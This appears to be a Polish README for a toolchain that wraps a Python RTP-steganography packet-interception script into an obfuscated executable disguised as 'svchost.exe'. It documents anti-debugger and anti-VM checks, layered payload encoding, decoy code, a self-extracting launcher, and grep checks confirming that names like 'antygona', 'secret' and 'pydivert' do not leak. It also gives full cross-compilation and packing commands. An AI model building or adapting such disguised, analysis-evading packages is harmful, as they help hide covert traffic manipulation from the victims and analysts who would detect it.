# RTP Steganography - Obfuscated EXE Builder

Narzędzie do budowania zobfuskowanego pliku wykonywalnego z `v2.py` (steganografia RTP via pydivert).

## Gotowy plik

**`svchost.exe`** - gotowy Windows PE32+ x86-64 executable (11 MB), zbudowany cross-kompilacją z Linux ARM (mingw64).

Zawiera:
- Self-extracting C launcher (skompilowany mingw64, stripped)
- Embedded Python 3.11 runtime
- Zobfuskowany payload (`v2_final.py`)

Działanie: rozpakowuje się do `%TEMP%\<losowy_dir>`, uruchamia skrypt, czyści po sobie.

## Struktura plików

| Plik | Opis |
|------|------|
| `svchost.exe` | **Gotowy Windows .exe** (PE32+ x86-64, self-extracting) |
| `v2.py` | Oryginalny skrypt Python |
| `v2_final.py` | Zobfuskowany Python (marshal+zlib+base85 + decoy code + anti-debug) |
| `generate_obfuscated.py` | Generator obfuskacji - przebuduj po zmianach w `v2.py` |
| `launcher.c` | Kod C launchera (cross-kompilacja mingw64) |
| `svchost_linux_nuitka` | Linux binary (Nuitka - kompilacja Python->C, **najlepsza ochrona**) |
| `svchost_linux_pyinstaller` | Linux binary (PyArmor + PyInstaller) |
| `build.bat` | Alternatywny build Windows .exe bezposrednio na Windowsie |
| `setup_and_build.sh` | Pelny build na Linuxie (wymaga `sudo`) |
| `build_docker.sh` | Build via Docker/Podman na maszynie x86_64 |
| `Dockerfile` | Obraz Docker do budowania .exe |

## Warstwy ochrony

### svchost.exe (Windows)

1. **Self-extracting C launcher** - natywny kod C, brak Pythona w headerze EXE
2. **Obfuskacja stringow** - `chr()` encoding zamiast czytelnych literalow
3. **Marshal + zlib + base85** - payload zakodowany w 3 warstwach
4. **Anti-debug** - wykrywa IDA, x64dbg, Ghidra, OllyDbg, procmon, debuggery
5. **Anti-VM** - sprawdza VMware, VirtualBox, QEMU, Xen w rejestrze
6. **Decoy code** - falszywe klasy, zmienne i funkcje mylace analityka
7. **Losowe nazwy zmiennych** - kazdy build generuje inne nazwy

### svchost_linux_nuitka (Linux)

Wszystko powyzej + dodatkowa warstwa:
- **Nuitka** - kompilacja Python->C (brak Python bytecode = `pyinstxtractor` / `uncompyle6` **nie dzialaja**)

## Weryfikacja ochrony

```bash
# sprawdz czy oryginalne nazwy wyciekaja
strings svchost.exe | grep -iE "antygona|DEADBEEF|secret|start_interceptor|pydivert"
# oczekiwany wynik: brak (0 trafien)

# sprawdz odpornosc na pyinstxtractor
strings svchost.exe | grep -c "PYZ\|pyiboot\|pyi_"
# oczekiwany wynik: 0
```

## Przebudowa

### Przebudowa svchost.exe (wymaga mingw64)

```bash
# 1. zainstaluj jesli nie masz
sudo dnf install -y mingw64-gcc mingw64-gcc-c++
pip install pyarmor

# 2. wygeneruj nowy zobfuskowany payload
python3 generate_obfuscated.py

# 3. skompiluj launcher
x86_64-w64-mingw32-gcc -O2 -s -mwindows -o launcher.exe launcher.c -lshlwapi -static

# 4. pobierz Python embeddable i przygotuj payload
mkdir -p /tmp/payload/python_runtime
cd /tmp/payload
wget https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip
unzip python-3.11.9-embed-amd64.zip -d python_runtime/
sed -i 's/#import site/import site/' python_runtime/python311._pth
cp /sciezka/do/v2_final.py python_runtime/__main__.py
zip -r /tmp/payload.zip python_runtime/

# 5. sklej EXE
cat launcher.exe > svchost.exe
printf '~~PAYLOAD_START~~' >> svchost.exe
cat /tmp/payload.zip >> svchost.exe
```

### Alternatywny build na Windows

1. Skopiuj folder `build_exe/` na maszyne Windows
2. Uruchom `build.bat`
3. Wynik: `svchost.exe` (PyArmor + PyInstaller, ~8 MB)

### Build via Docker (x86_64)

```bash
./build_docker.sh
# Wynik w output/svchost.exe
```

## Porownanie metod

| Cecha | Self-extract (mingw) | PyInstaller | Nuitka (Linux) |
|-------|---------------------|-------------|----------------|
| Platforma docelowa | **Windows** | Windows/Linux | Linux |
| Cross-kompilacja z ARM | **Tak** | Nie | Nie |
| Python bytecode widoczny | Nie (zip w payloadzie) | Tak (zaszyfrowany) | **Nie** (C code) |
| `pyinstxtractor` dziala | **Nie** | Tak (z wysilkiem) | **Nie** |
| `uncompyle6` dziala | Nie bezposrednio | Tak (po ekstrakcji) | **Nie** |
| Analiza w IDA/Ghidra | Launcher prosty, payload ukryty | Latwa | Trudna |
| Rozmiar | ~11 MB | ~8.5 MB | ~7.2 MB |
| Wymaga na buildzie | mingw64-gcc | Python + pip | Python + gcc |

## Uwagi

- `svchost.exe` wymaga uruchomienia jako administrator (pydivert/WinDivert potrzebuje elevated privileges)
- Plik `antygona.txt` musi byc w tym samym katalogu co .exe podczas uruchamiania
- Embedded Python runtime to oficjalny Python 3.11.9 embeddable (bez pydivert - zainstaluj na maszynie docelowej albo dodaj wheel do payloadu)
